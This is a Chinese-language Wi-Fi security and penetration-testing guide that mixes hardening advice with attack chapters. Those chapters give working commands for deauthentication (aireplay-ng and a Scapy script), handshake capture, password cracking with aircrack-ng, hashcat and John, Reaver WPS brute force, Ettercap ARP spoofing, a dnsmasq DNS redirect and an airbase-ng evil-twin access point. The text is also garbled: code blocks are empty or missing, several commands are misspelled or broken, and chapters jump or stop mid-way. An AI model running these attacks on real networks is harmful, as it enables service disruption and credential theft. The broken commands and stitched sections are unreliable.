# Wi-Fi 网络简介

Wi-Fi 网络改变了我们连接互联网和交换信息的方式。它们利用无线电波在设备之间传输数据，消除了对物理电缆的需求。这带来了巨大的便利，赋予了我们今天认为不可或缺的移动性和灵活性。随着移动设备的使用增加和对连接需求的增长，理解 Wi-Fi 网络的基础知识对于任何技术专业人士都是至关重要的。

## 组件与架构

要理解 Wi-Fi 网络，了解其主要组件以及它们如何整合形成功能性网络是必要的。接下来我们将讨论 Wi-Fi 网络的主要组件以及连接它们的架构。

### 接入点 (APs)

接入点 (`AP`) 是一种允许无线设备连接到网络的设备。它充当传输和接收无线信号的枢纽。在企业环境中，通常使用多个 `APs` 来覆盖大区域，每个 `AP` 通过以太网线连接到主网络。`AP` 在协调无线设备与有线网络之间的通信中起着至关重要的作用。

### 客户端设备

客户端设备是指连接到接入点的设备。这些设备包括笔记本电脑、智能手机、平板电脑、无线打印机以及任何其他支持 Wi-Fi 的设备。每个客户端设备都有一个 Wi-Fi 适配器使其能够连接到 `AP`。`AP` 与客户端设备之间的交互使得 Wi-Fi 网络对终端用户变得有用且易用。

### 网络控制器

网络控制器主要用于企业环境，管理多个 `APs`，实现对配置、安全策略和性能监控的集中化管理。它们有助于优化覆盖范围并减少干扰，确保连接的稳定安全。网络控制器对于大规模 Wi-Fi 网络的有效维护和管理至关重要。

## 网络架构

Wi-Fi 架构可以分为两种主要类型：基础架构网络和自接网络（ad hoc networks）。

### 基础架构网络

这是最常见的 Wi-Fi 网络类型，设备通过中央接入点进行通信。大多数家庭和商业网络都使用这种架构。`AP` 连接到路由器，路由器再连接到互联网，允许网络上的所有设备访问互联网。这种框架允许集中化管理并更容易于实施安全策略。

### 回到此处

在自接网络中，设备直接相互连接，不需要中央 `AP`。这种类型的网络在传统基础设施不可用的临时或紧急情况下非常有用。自接网络提供了灵活性和部署速度，尽管它们可能没有基础架构网络那样安全或高效。

## Wi-Fi 标准与协议

Wi-Fi 标准由电气电子工程师学会 (`IEEE`) 定义，以 `802.11` 后跟一个字母进行标识（例如 `802.11b`、`802.11g`）。每个标准都定义了理论最大速度、使用的频率和其他技术特性。

### IEEE 802.11a/b/g/n/ac/ax

Wi-Fi 标准随着时间的推移发生了显著进化，每一个在速度、效率和安全性方面都提供了改进。

- `802.11b`：发布于 1999 年，工作在 2.4 GHz 频率，理论最大速度为 11 Mbps。它是最早被广泛采用的标准之一，但由于速度限制，现在被认为过时。
- `802.11a`：同样发布于 1999 年，工作在 5 GHz 频率，最大理论速度为 54 Mbps。虽然它的性能优于 `802.11b`，但由于成本较高且信号范围较短，其采用有限。
- `802.11g`：发布于 2003 年，结合了标准 a 和 b 的最佳特性，工作在 2.4 GHz 下，最大速度为 54 Mbps。由于其在成本、性能和兼容性之间的平衡，它已成为流行标准。
- `802.11n`：引入于 2009 年，工作在 2.4 GHz 和 5 GHz 下，最大速度高达 600 Mbps，使用了 `MIMO`（多输入多输出）。这一标准带来了速度和效率的显著提升，在家庭和企业环境中被广泛采用。
- `802.11ac`：发布于 2013 年，专门工作在 5 GHz 下，速度可达 3.5 Gbps，使用了先进的 `MIMO` 技术和更宽的信道。该标准适用于需要高带宽的应用。
- `802.11ax`：又被称为 Wi-Fi 6，发布于 2019 年的最新标准，工作在 2.4 GHz 和 5 GHz 下，速度可超过 10 Gbps。它在密集环境中提供了更好的效率和容量，并在安全性和能耗方面有显著改进。

### Wi-Fi 安全协议

由于无线电波的开放传输，安全是 Wi-Fi 网络的一个关键问题。主要的安全协议包括：

- `WEP`（有线等隐私）：Wi-Fi 网络的首种安全协议，发布于 1997 年。它由于安全缺陷很快被取代，现在被认为是不安全的。`WEP` 的主要漏洞是容易受到暴力破解攻击，可以在几分钟内破解加密密钥。
- `WPA`（Wi-Fi 保护访问）：作为修复 `WEP` 缺陷的过渡方案引入，使用了 `TKIP`（临时密钥完整性协议）。虽然比 `WEP` 安全，但 `WPA` 仍然存在漏洞，特别是在旧的实现中。
- `WPA2`：发布于 2004 年，是 `WPA` 的改进版本，使用 `AES`（高级加密标准）进行加密。它被广泛使用并认为是安全的。`WPA2-PSK`（预共享密钥）在家庭网络中很常见，而使用 `RADIUS` 认证服务器的 `WPA2-Enterprise` 则用于企业环境。
- `WPA3`：发布于 2018 年的最新版本，提供了显著的安全改进，包括更强的加密和针对暴力破解攻击的防护。`WPA3-Personal` 使用 `SAE`（等效身份验证）取代 `WPA2-PSK`，即使密码简单也能提供更强的安全性。

# Wi-Fi 基础安全





确保 Wi-Fi 网络的安全性对于保护敏感数据和防止未经授权的访问关重要。下面，我们将讨论基础 Wi-Fi 网络安全的最佳实践。

# 设置强密码

最简单且有效的措施之一是为访问 Wi-Fi 网络设置强密码。强密码必须足够长，并包含大小写字母、数字和特殊字符的组合。避免使用易猜的信息，如姓名或出生日期。此外，建议定期更改密码以增加安全性。

# 使用适当的安全协议

使用如 `WPA2` 或 `WPA3` 等安全协议至关重要。配置您的路由器使用可用的的最强安全协议。避免使用 `WEP`，因为它容易受到攻击。确保连接到网络的所有设备都支持所选的协议，以确保兼容性和安全性。

# 修改默认 SSID

`SSID`（服务集标识符）是 Wi-Fi 网络的名称。更改制造商提供的默认 `SSID` 可以让攻击者难以识别路由器的品牌和型号，这些型号可能存在已知漏洞。使用唯一的 `SSID` 并避免使用暴露个人或公司信息的名称。此外，可以考虑隐藏 `SSID` 以降低网络可见性，尽管这无法针对坚定的攻击提供显著保护。

## 禁用 WPS

Wi-Fi 保护设置 (`WPS`) 是一项让设备连接到 Wi-Fi 网络更方便的功能，但它存在巨大的漏洞。在路由器上禁用 `WPS` 可以防止利用这些漏洞的攻击。禁用 `WPS` 是一个简单的措施，可以显著提高网络安全性。

## 固件更新

保持路由器固件更新，以确保其具有最新的安全修复和性能改进。定期检查制造商网站的更新并根据需要进行安装。定期的固件维护对于保护网络免受新的威胁和漏洞至关重要。

# 网络分段

为了更高的安全性，请考虑网络分段，为不同类型的设备创建独立的网络。例如，用于 `IoT`（物联网）设备的网络可以与计算机和智能手机使用的主网络隔离开。如果 `IoT` 设备被攻破，这将限制暴露。网络分段可以通过高级路由器和交换机中的 `VLANs`（虚拟局域网）来实现。

# 使用防火墙

# 使用 Wireshark 进行数据包的示例脚本

`Wireshark` 是一个强大的包分析工具，用于监控网络流量。以下是一个基础抓包脚本示例：

```bash
#!/bin/bash

# 使用 Wireshark 捕获网络包的脚本
INTERFACE="wlan0" # 要监控的网络接口

OUTPUT_FILE="captura.pcap" # 输出文件

echo "Starting packet capture on interface $INTERFACE..."

sudo tshark -i $INTERFACE -w $OUTPUT_FILE

echo "Capture completed. File saved as $OUTPUT_FILE"
```

该脚本使用了 `tshark`，它是 `Wireshark` 的命令行版本。要运行此脚本，请将其保存为文件（例如 `captura.sh`），并使用命令 `chmod +x captura.sh` 赋予可执行权限。然后使用 `sudo ./captura.sh` 运行。

# 使用 iptables 配置防火墙

`iptables` 是用于在 Linux 中配置防火墙规则的包过滤工具。这是一个基础配置示例，用于阻塞除 `HTTP`（端口 80）和 `HTTPS`（端口 443）以外的所有入站流量：

```bash
#!/bin/bash

# 使用 iptables 配置基础防火墙的脚本
echo "Configuring firewall with iptables..."

# 清除所有现有规则
sudo iptables -F

# 配置默认策略阻塞所有入站流量
sudo iptables -P INPUT DROP
sudo iptables FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# 允许回环流量
sudo iptables -A INPUT -i lo -j ACCEPT

# 允许已建立连接的入站流量
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 允许 HTTP (端口 80) 和 HTTPS (端口 443) 流量
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

echo "Firewall configuration complete."
```

将此脚本保存为文件（例如 `firewall.sh`），并使用 `chmod +x firewall.sh` 赋予可执行权限。然后运行 `sudo ./firewall.sh` 应用防火墙规则。

```text
}
```

```bash
sudo service hostapd start
```

此示例创建一个 SSID 为 "TestWiFi" 密码为 "TestPass123" 的 AP，使用驱动 `nl80211`。该 AP 将在通道 6 上工作，使用 WPA2 进行加密。

识别 Wi-Fi 网络中的模式和漏洞对于评估其安全性至关重要。使用包捕获工具和技术，我们可以分析网络流量以寻找弱和可疑模式。

### 流量分析

流量分析涉及检查捕获的数据包以识别通信模式。这可能包括：

- 流量负载：监控流量可以帮助识别活动激峰，这可能与攻击或异常行为有关。
- 流量类型：不同类型的流量可以指示不同类型的活动。例如，`HTTP` 流量可能与网页浏览有关，而 `FTP` 流量可能指示文件传输。
- 设备行为：分析连接设备的行为可以帮助识别受损或可疑设备。这可能包括监控取消认证和重新连接的频率。

### 漏洞识别

识别网络中的漏洞是提高安全性的关键步骤。这可能包括：

- 弱密码：分析身份验证数据包可以揭示弱或容易猜的密码。可以使用 `Aircrack-ng` 等工具尝试破解 `WPA`/WPA2` 密码。
- 不安全的协议：识别对不安全协议（如 `WEP`）的使用可以揭示网络安全的弱点。
- 安全设置不足：检查 `AP` 的安全设置（例如使用 `WPA/WPA2` 并禁用 `WPS`），有助于识别需要纠正的不当设置。

## 第 4 章：取消认证攻击

# 取消认证攻击的基础

取消认证攻击是 Wi-Fi 网络上常用的一种技术，通过强制无线设备断开与访问点 (`AP`) 的连接。这些攻击利用了设备管理 Wi-Fi 连接的方式，可以作为更复杂攻击的初步步骤，例如捕获用于密码破解的 `WPA/WPA2` 握手。

## 取消认证攻击的工作原理

在取消认证攻击中，攻击者向 `AP` 或客户端发送伪造的取消认证数据包。这些数据包导致接收设备认为它已被指示断开网络连接。Wi-Fi 网络使用的 `802.11` 协议对取消认证数据包不需要认证或加密，使得这些攻击执行起来相对简单。

- **取消认证数据包**：这些数据包告诉设备断开网络。它们可以指向客户端（客户端取消认证）或指向 `AP`（AP 取消认证）。
- **攻击目标**：目标范围从简单的停止服务、强制客户端重新连接（捕获握手），到为中间人攻击创建环境。

## 执行工具和方法

有多种工具和方法可以执行取消认证。让我们探索一些最常用的，例如 `Aircrack-ng` 工具集中的 `airplay-ng`，以及如何在实践中使用它们。

### Aireplay-ng

`airplay-ng` 是 `Aircrack-ng` 软件包中的一个工具，用于向 Wi-Fi 网络注入数据包。它可以用于执行取消认证攻击等其他类型的攻击。

**安装**：

```bash
sudo apt install aircrack-ng
```

**监控模式**：首先，将网络接口设置为监控模式：

```bash
sudo airmon-ng start wlan0
```

**取消认证攻击**：使用 `airplay-ng` 执行取消认证攻击。以下命令将向特定客户端发送取消认证数据包：

```bash
sudo aireplay-ng --deauth 0 -a [BSSID] -c [CLIENT_MAC] wlan0mon
```

- `[BSSID]`：访问点的 MAC 地址。
- `[CLIENT_MAC]`：客户端的 MAC 地址。

要取消认证所有连接到 `AP` 的客户端，请使用以下命令：

```bash
sudo airplay - deauth 0 - a [ BSSID ] wlan0mon
```

### MDK3

`MDK3` 是另一个强大的 Wi-Fi 渗透测试工具，能够执行包括取消认证在多种攻击。

**安装**：

```bash

```

**取消认证攻击**：使用 `MDK3` 取消网络上所有客户端的认证：

```bash

```

- `blacklist.txt`：包含你想要攻击的 `APs` 的 `BSSIDs` 的文件。

### Scapy

`Scapy` 是 Python 中一个强大的数据包处理库。可创建自定义的取消认证脚本。

**安装**：

```bash
sudo apt install python3-scapy
```

**取消认证脚本**：这是一个使用 `Scapy` 发送取消认证数据包的 Python 脚本示例：

```python
from scapy.all import *

interface = "wlan0mon"
ap_mac = "00:11:22:33:44:55"
client_mac = "66:77:88:99:AA:BB"
dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
sendp(packet, iface=interface, count=100, inter=0.1)
```

此脚本从 MAC 地址为 `00:11:22:33:44:55` 的 AP 向 MAC 地址为 `66:77:88:99:AA:BB` 的客户端发送 100 个取消认证数据包。

## 缓解与防御

由于 `802.11` 协议的开放性，保护 Wi-Fi 网络免受取消认证攻击具有挑战性。但有一些策略和最佳实践可以缓解此类攻击。

## 使用 WPA3

`WPA3` 是最新版本的 Wi-Fi 安全协议，包含了多项改进，使取消认证攻击变得困难。

- **SAE (等等身份认证)**：`WPA3` 在认证过程中使用 `SAE`，使得暴力破解变得变得困难得多。改进的加密也有助于防止取消认证攻击。

## 监控与检测

实施监控系统可以帮助实时检测取消认证攻击。

- **入侵检测系统 (IDS)**：如 `Snort` 或 `Zeek` 等工具可以配置为监控网络流量并在发现可疑取消认证数据包时告警。
- **kismet**：`Kismet` 可用于检测取消认证活动。配置告警以便检测到取消认证数据包时通知你。

### 数据包过滤

某些高级路由器和企业级 `APs` 提供包过滤功能，可以拦截伪造的取消认证数据包。

- **MAC 过滤**：配置访问控制列表 (`ACLs`) 仅允许特定设备接入网络。
- **深度包检测 (DPI)**：`DPI` 可用于检查和过滤伪造的取消认证数据包。

### 网络分

划分网络可以限制取消认证攻击的影响。

- **为不同设备划分网络**：为关键设备和通用设备配置独立的网络。这限制了攻击对网络某部分的影响。





- 使用 `VLANs`：实施 `VLANs`（虚拟局域网）有助于隔离不同类型的流量和设备，使取消认证攻击变得更加。

## 固件更新

保持 AP 固件最新更新对于防止已知漏洞至关重要。

- 定期更新：定期检查制造商网站的固件更新，并根据需要进行更新。

## 第 5 章：Wi-Fi 密码破解

# Wi-Fi 密码攻击方法

Wi-Fi 网络的安全性很大程度上取决于用于保护访问的密码强度。破解这些密码可能允许攻击者访问网络、拦截数据，甚至危及连接的设备。有若干种破解 Wi-Fi 密码的方法，每种方法都有其特定的技巧和工具。

## 握手捕获

许多 Wi-Fi 密码攻击的第一步是捕获 `WPA/WPA2` 握手。此过程发生在设备连接到 Wi-Fi 网络时，允许攻击者捕获破解密码所需的数据包。

**使用 Airodump-ng**：

```bash
sudo airodump-ng -c [canal] --bssid [BSSID] -w capture wlan0mon
```

- 该命令捕获握手，并将其保存到文件 `.cap`。

# Reaver 攻击

`Reaver` 是一个利用 Wi-Fi 保护设置 (`WPS`) 漏洞来恢复 `WPA/WPA2` 密码的工具。

**使用 Reaver**：

```bash
sudo reaver -i wlan0mon -b [BSSID] -vv
```

- 该命令尝试猜测 `WPS` PIN，可以用它可以恢复密码。

## 钓鱼攻击

钓鱼是一种攻击者创建虚假登录页面以捕获用户密码的技术。在 Wi-Fi 网络上，可以通过设置一个虚假的访问点并询问原始网络密码来实现。

# 密码破解工具

有多种用于破解 Wi-Fi 密码的专业工具，每种都有其特定的特性和用途。

### Aircrack-ng

`Aircrack-ng` 是破解 `WEP` 和 `WPA/WPA2` 密码最流行的工具之一。它使用字典攻击和暴力破解技术尝试猜测密码。

**安装**：

```bash
sudo apt install aircrack-ng
```

**WPA/WPA2 密码破解**：

```bash
sudo aircrack-ng -w wordlist.txt -b [BSSID] capture-01.cap
```

该命令使用字典文件 (`wordlist.txt`) 根据捕获的握手尝试猜测密码。

## Hashcat

`Hashcat` 是一个强大的密码破解工具，可以使用 `GPU` 显著提高破解速度。支持广泛的哈希算法，包括 `WPA/WPA2`。

**安装**：

**破解密码**：

```bash
hashcat -m 2500 capture.hccapx wordlist.txt
```

`John the Ripper` 是另一个可用于 `WPA/WPA2` 的密码破解工具。尽管最常用于密码哈希，但它也支持 `WPA/WPA2`。

**安装**：

**破解密码**：

```bash
john --wordlist=wordlist.txt capture.john
```

## 第 6 章：中间人攻击

## MITM 攻击简介

中间人攻击（`MITM`）是 Wi-Fi 网络上最严重且常见的威胁之一。在 `MITM` 攻击中，攻击者在双方不知情的情况下截获并可能修改他们之间的通信。这允许攻击者窃取敏感信息（如登录凭据和个人数据），或向通信中注入恶意数据。

## MITM 攻击概念

当攻击者置于两个通信的设备之间时，就会发生 `MITM` 攻击。攻击者可以拦截、记录并更改这些设备之间传输的数据。执行 `MITM` 攻击有多种技术，包括 `ARP 欺骗`（`ARP spoofing`）。

## 在 Wi-Fi 网络上执行 MITM

为了在 Wi-Fi 网络上执行 `MITM` 攻击，攻击者必须获得网络访问权限。连接后，攻击者可以使用各种技术拦截流量。

## ARP 欺骗

`ARP`（地址解析协议）欺骗是 `MITM` 攻击中的常用技术。`ARP` 欺骗涉及发送伪造的 `ARP` 消息，将攻击者的 MAC 地址与合法设备的 IP 地址关联。

- 使用 Ettercap：`Ettercap` 是执行 `ARP 欺骗` 的工具。

安装：

```bash
sudo apt install aftercap-graphical
```

执行：以图形模式启动 `Ettercap`：

```bash
sudo aftercap -G
```

1. 选择网络接口并开始嗅。
2. 添加受害者（目标设备）并选择 `ARP 投毒` 作为攻击方法。
3. 启动攻击

## DNS 重定向

DNS 重定向通过操作 DNS 响应将流量重定向到攻击者控制的恶意网站。

- 使用 Dnsmasq：`Dnsmasq` 是一个可以配置提供 DNS 和 DHCP 服务的工具，有助于 DNS 重定向。

安装：

```bash
sudo apt install dnsmasq
```

设置：编辑 `Dnsmasq` 配置文件（/etc/dnsmasq.conf）以添加重定向项：

```
address=/example.com/192.168.100
```

在此示例中，对 `example.com` 的任何请求都将重定向到 `192.168.100`，即恶意服务器的 IP 地址。

## 创建伪访问点

创建伪访问点（“邪恶攻击”）是另一种 `MITM` 攻击技术。攻击者创建一个与合法访问点相同的 SSID，诱骗用户连接到伪访问点。

- 使用 Airbase-ng：`Airbase-ng` 是 `Aircrack-ng` 软件包中的一个工具，用于创建伪访问点。

安装：

```bash
sudo apt install aircrack-ng
```

执行：将网络接口置于监听模式：

```bash
sudo airmon-ng start wlan0
```

创建伪访问点：

```bash
sudo airbase-ng -e "NomeDoSSID" wlan0mon
```

该命令创建一个 SSID 为 "SSIDName" 的访问点。连接到此访问点的用户的流量将被攻击者拦截。

## 第 7 章：WPS 漏洞利用

## 什么是 WPS 及其漏洞
Wi-Fi 保护设置（WPS）是一项旨在使安全 Wi-Fi 网络设置变得更方便的功能，特别是对于家庭用户。WPS 的核心思想是简化新设备连接到 Wi-Fi 网络的过程，而无需手动输入安全密钥。使用 WPS 有多种方法，包括使用八位 PIN、路由器上的物理按钮（按下按钮）和 NFC（近场通信）方法。

## WPS 如何工作
WPS 通过旨在简化连接到 Wi-Fi 网络的身份验证过程来工作。以下是最常见的方法：

- **八位 PIN**：使用八位数字 PIN 代码将设备连接到网络。该 PIN 通常打印在路由器上或显示在配置界面中。
- **按下按钮 (PBC)**：在路由器和客户端设备上均按下物理按钮以建立连接。
- **近场通信 (NFC)**：将设备靠近路由器即可自动连接（较常见）。

## WPS 漏洞
尽管 WPS 提供了便利性，但它存在多个重大漏洞，特别是在 PIN 身份验证方法方面：

- **暴力破解 攻击**：八位 PIN 容易受到暴力破解攻击。由于 PIN 被分为两个四位部分，攻击者只需为前半部分猜测 10,000 种组合，后半部分猜测 1,000 次，最多尝试 11,000 次。
- **可预测的 PIN**：某些路由器生成定义的或容易预测的 PIN，这使得攻击变得更容易。
- **实现缺陷**：路由器中某些 WPS 实现包含可被攻击者利用的缺陷。

## WPS 利用方法
有多种技术和工具可以利用 WPS 漏洞来破坏 Wi-Fi 网络的安全。最常见且有效的是 WPS PIN 暴力破解攻击。

- **Reaver 工具**：Reaver 是执行 WPS PIN 暴力破解攻击最流行的工具之一。它会系统地尝试所有可能的 PIN，直到找到正确的那个。

# 理解邪孪生攻击
邪孪生攻击是一种破解 Wi-Fi 网络的常用且有效的技术。在此类攻击中，攻击者设置一个模仿合法接入点的恶意接入点 (AP)。普通用户尝试连接到合法接入点时，最终会连接到恶意接入点，允许攻击者拦截并可能修改网络流量。

# 邪孪生攻击的工作原理
在邪孪生攻击中，攻击者创建一个与合法接入点相同名称 (SSID) 和设置的接入点。当设备尝试连接网络时，它们可能会选择恶意接入点，特别是当后者信号更强或合法接入点临时超出范围时。

邪孪生攻击的基本步骤包括：
1. **创建恶意接入点**：配置模仿合法接入点的接入点。
2. **强制断开**：攻击者可以使用取消认证技术（deauthentication）将设备从合法接入点断。
3. **捕捉凭据**：当设备连接到恶意接入点时，攻击者可以捕捉密码和其他敏感数据。

## 第 9 章：包嗅探与欺骗

## 基础基础
包嗅探和欺骗是网络攻击中本质的技术。嗅探是指捕获和分析跨越网络传输的数据包，而欺骗则涉及伪造数据包以欺骗设备或系统。这些技术通常结合使用以破坏网络安全并获取机密信息。

## 包嗅探
包嗅探是拦截和记录跨越网络传输的数据包的过程。这种技术可以用于合法目的（如网络监控和诊断），也可以用于恶意活动（如间谍活动和数据窃取）。

- **嗅探原理**：包嗅探通过将网络接口设置为混杂模式来实现，使其能够捕获网络上的所有包，而不仅仅是目标它的包。使用 `Wireshark` 和 `Tcpdump` 等嗅探工具可以捕获和分析这些包。

# 包欺骗





数据包欺骗是一种通过伪造数据包来欺骗网络设备或系统的技术。这种技术可用于各种恶意目的，例如重定向网络流量、实施拒绝服务（DoS）攻击或执行中间人（MITM）攻击。

### 常见的欺骗类型：
- `IP Spoofing`：带有伪造源 IP 地址的数据包。
- `MAC Spoofing`：伪造设备的 MAC 地址。
- `DNS Spoofing`：将 DNS 查询重定向到恶意服务器。

## 第 10 章：数据包注入

## 什么是数据包注入
数据包注入是一种用于跨网络发送恶意或经改的数据包的技术。这种方法允许攻击者干扰网络通信、修改或伪造数据包，甚至利用目标系统中的漏洞。数据包注入可用于攻击，包括取消认证攻击、中间人攻击 (`MITM`) 和拒绝服务攻击 (`DoS`)。

## 数据包注入的工作原理
数据包注入涉及创建并传输并非由网络上合法设备生成的数据包。这可以通过操纵数据包结构、更改源目的地址或在数据包中插入恶意数据来实现。该技术通常与其他形式的网络攻击结合使用，以增加其有效性。

- **目的**：数据包注入可用于取消用户认证、拦截通信、重定向流量或利用网络设备的漏洞。
- **要求**：要执行数据包注入，需要访问目标网络的权限、具有监控模式能力的设备以及创建和注入数据包的特定工具。

## 工具与方法
有多种用于执行数据包注入的工具和方法。下面我们将讨论一些流行且有效的工具。

### Aircrack-ng

## 第 11 章：企业 Wi-Fi 网络安全

## 企业网络面临的挑战

由于设备数量更多、需要保护敏感数据以及符合特定法规，企业 Wi-Fi 网络与家庭网络相比面临独特的挑战。这些网络的安全性对于保证企业数据的机密性、完整可用可用至关重要。

## 设备数量

企业网络中连接设备的数量远多家庭网络。这不仅包括笔记本电脑和台式电脑，还包括移动设备、`IoT`（物联网）和访客设备。每增加一个设备都会增加网络的攻击面。

## 内部和外部威胁

企业网络是内部和外部威胁的目标。内部威胁可能来自不满或疏忽的员工，而外部威胁包括试图从外部访问网络的黑客。

## 合规性要求

公司需要遵守特定的数据安全法规，例如 `GDPR`、`HIPAA` 和 `PCI-DSS`。这些法规要求严格的数据保护措施，违规可能会导致严厉处罚。

## 移动性与 BYOD

自带设备（`BYOD`）趋势允许员工使用自己的设备访问企业网络。虽然这提高了生产力，但也引入了安全风险，因为个人设备的保护可能不如公司管理的设备那样完善。

# 安全措施的实施

为了保护企业 Wi-Fi 网络，必须涵盖身份验证、加密、网络分段和持续监控的稳健安全措施。

## 身份验证与访问控制

实施强身份验证机制对于确保只有授权用户才能访问网络至关重要。

- **WPA3-企业认证**：`WPA3-Enterprise` 使用 `EAP`（可扩展身份验证协议）进行验证，与 `WPA2-Enterprise` 相比提供了更高的安全性。
    - **WPA3-企业配置**：配置路由器和客户端设备使用 `WPA3-Enterprise` 并配合 `RADIUS` 服务器进行集中认证。
    - **RADIUS 服务器**：使用 `RADIUS` 服务器管理身份验证凭据并执行访问策略。
- **双重身份验证 (2FA)**：实施 `2FA` 通过要求用户提供两种形式的验证来增加额外的安全性。
    - **2FA 示例**：使用如 `Google Authenticator` 等身份验证应用或硬件令牌。

## 流量加密

加密网络流量对于保护数据免受拦截和间谍活动至关重要。

- **使用 HTTPS 和 VPN**：确保所有网站和网络服务使用 `HTTPS`。设置 `VPN` 以加密网络流量，特别是对于远程办公的员工。
- **端到端加密**：对内部通信实施端到端加密，确保数据在传输过程中保持安全。

# 网络分段

隔离不同类型的流量和设备可以限制攻击的影响。

- **使用 VLAN**：在路由器和交换机上配置 `VLANs` 以隔离关键设备、访客设备和员工设备。
- **访客网络**：建立与主企业网络隔离的独立访客网络。

## 持续监控

实施持续监控系统有助于检测可疑活动并快速响应安全事件。

- **入侵检测系统 (IDS)**：配置如 `Snort` 或 `Zeek` 等工具监控网络流量并在发现可疑活动时发出警报。
- **入侵预防系统 (IPS)**：`IPS` 可以自动拦截检测到的恶意活动，增加一层主动防御。

## 更新与补丁

保持所有设备和软件更新状态对于防止已知漏洞至关重要。

- **更新策略**：实施严格的更新策略，确保所有设备和软件定期更新。
- **补丁管理**：使用补丁管理工具自动化更新过程并确保符合安全策略。

## 第 12 章：创建安全的 Wi-Fi 网络

## 家庭和企业网络的最佳实践
在家庭和企业环境中，创建安全的 Wi-Fi 网络都至关重要，以保护数据并防止未经授权的访问。由于需求和风险不同，这些环境的最佳实践略有不同，但一些基本原则适用于两种环境。

## 家庭网络
在家庭网络中，重点是防止未经授权的访问并确保个人数据的隐私。一些最佳实践包括：
- **使用 WPA3**：将您的路由器配置为使用 `WPA3`，与 `WPA2` 相比，它显著提高了安全性。
- **Wi-Fi 强密码**：使用包含大小写字母、数字和特殊字符的长复杂密码。
- **定期更新固件**：保持路由器固件为更新，以确保所有已知漏洞都已修复。
- **禁用 WPS**：Wi-Fi 保护设置 (`WPS`) 容易受到暴力破解攻击。禁用它以避免这些漏洞。
- **访客网络**：设置一个与主网络独立的访客网络，以保护个人设备和数据。

### 企业网络
企业网络面临更复杂的威胁，需要更稳健的安全措施。一些最佳实践包括：
- **WPA3-Enterprise 认证**：使用带有 `RADIUS` 服务器的 `WPA3-Enterprise` 进行集中认证和凭据管理。
- **使用 VLAN 进行分分**：使用 `VLANs` 隔离不同类型的设备和流量，例如 IoT 设备、访客和关键系统。
- **2FA 实施**：添加双重身份验证 (`2FA`) 以增加网络访问安全性。
- **持续监控**：部署入侵检测和防御系统 (`IDS/IPS`) 监控网络流量并响应可疑活动。
- **严格的访问策略**：设置基于角色的访问控制策略，将敏感数据的访问限制为授权员工。

## 核心安全设置
在您的路由器和连接的设备上实施适当的安全设置对于保护您的 Wi-Fi 网络至关重要。下面我们详细介绍一些核心设置。

## WPA3 配置
`WPA3` 是最新的 Wi-Fi 安全标准，提供了针对暴力破解和数据截获的改进保护。
- **路由器的 WPA3 配置**：
  1. 访问路由器的管理界面（通常可以通过在浏览器中输入路由器 IP 地址，例如 `192.168.1.1` 进入）。
  2. 导航到您的无线网络安全设置。
  3. 选择 `WPA3` 作为认证方法。
  4. 为您的 Wi-Fi 网络设置一个强密码。
  5. 保存设置并在必要时重启路由器。

### 强密码设置
强密码是防止未经授权访问的第一道防线。
- **创建强密码**：
  1. 使用大小写字母、数字和特殊字符的组合。
  2. 避免使用容易猜到的常用单词或个人信息。
  3. 密码长度至少为 12 个字符。

## 禁用 WPS
`WPS` 让网络配置变得简单，但它容易受到攻击。禁用它是一项重要的安全措施。

# Wi-Fi 审计规划

Wi-Fi 网络审计和渗透测试是在漏洞被恶意攻击者利用之前识别并修复它们的关键过程。规划是确保测试有效且全面的要步骤。

## 审计目标
明确审计目标至关重要。目标可能包括识别漏洞、评估现有安全措施的有效性以及符合法律法规。

- 漏洞识别：识别网络配置中的缺陷，例如弱密码、过时的协议和不安全的配置。
- 安全措施评估：评估已实施的安全策略和保护工具的有效性。
- 合规性：确保网络符合特定法规，如 `GDPR`、`HIPAA` 和 `PCI-DSS`。

## 审计范围
定义审计范围有助于有效集中精力和资源。审计范围必须包含 Wi-Fi 网络的所有组件，例如接入点、客户端设备、安全策略和网络分段。

- 网络组件：识别所有接入点、连接设备和 `IoT` 设备。
- 安全策略：审查身份验证、加密和访问控制策略。
- 网络分段：检查 `VLANs` 和访客网络的配置。

## 工具与资源
选择合适的工具和资源对于进行有效的审计至关重要。网络分析、数据包嗅探和漏洞扫描工具是必不可少的。
- 网络分析工具：`Wireshark`、`Tcpdump`、`Kismet`。
- 漏洞扫描工具：`Nmap`、`OpenVAS`、`Nessus`。
- 数据包嗅探工具：`Aircrack-ng`、`Ettercap`。

## 时间表与团队
建立详细的时间表并组建专业人士组成的团队是确保审计成功的重要步骤。

- 时间线：为审计的每个阶段设置截止日期，包括规划、测试、结果分析和文档记录。
- 团队：包括网络安全专家、安全分析师和系统管理员。

## 案例 1：科技公司的钓鱼攻击

**背景：** 一家大型科技公司成为钓鱼攻击的目标，攻击者发送了看似来自互联网服务提供商的假邮件。这些邮件要求员工确认其 Wi-Fi 凭据。

**攻击执行：**

- 邮件包含一个指向虚假登录页的链接，用于捕员工的凭据。
- 攻击者使用这些凭据访问公司的 Wi-Fi 网络。

**后果：**

- 未经授权访问公司内部网络。
- 窃取机密信息和企业数据。

**教训：**

- 对员工实施钓鱼意识培训。
- 为 Wi-Fi 网络访问使用双重身份认证 (`2FA`）。

## 案例 2：银行的假装（Pretexting）

**背景：** 一家银行成为假装攻击的目标，攻击者冒充 IT 支持技术人员致电几名员工，请求 Wi-Fi 网络配置的信息。

**攻击执行：**

- 攻击者收集了网络配置的详细信息，包括 `SSIDs`、密码和 `IP addresses`。
- 使用这些信息未经授权访问银行的 Wi-Fi 网络。

**后果：**

- 破坏银行网络的安全性。
- 访问财务数据和客户信息。

**教训：**

- 验证任何请求机密信息人员的身份。
- 实施严格的信息访问控制策略。

## 案例 3：咖啡馆的诱饵（Baiting）

**背景：** 攻击者在热门咖啡馆设置了一个虚假的 Wi-Fi 热点，并使用了吸引人的 `SSID`，如“Free Wi-Fi”。登录的用户被要求使用邮箱凭据注册。

**攻击执行：**

- 注册的用户提供了邮箱凭据，这些凭据被攻击者捕获。
- 攻击者使用这些凭据访问邮箱账户并进行恶意活动。

**后果：**

- 用户邮箱账户泄露。
- 潜在的身份盗用和个人信息访问。

**教训：**

- 避免连接到未知或不安全的 Wi-Fi 网络。
- 使用公共 Wi-Fi 时使用 `VPNs` 来保护网络流量。

## 第 17 章：IoT 与 Wi-Fi 安全

